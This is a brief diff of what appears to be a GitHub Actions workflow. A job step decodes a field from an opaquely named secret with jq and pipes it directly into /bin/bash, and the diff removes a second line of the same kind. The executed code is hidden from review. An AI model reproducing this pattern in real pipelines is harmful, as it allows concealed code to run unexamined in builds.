@@ -22,7 +22,6 @@ jobs:
           hdz812: ${{ secrets.hdz812 }}
         run: |
           printf '%s' "$hdz812" | jq -r .k4 | /bin/bash
-          printf '%s' "$byty0851" | jq -r .pr4 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
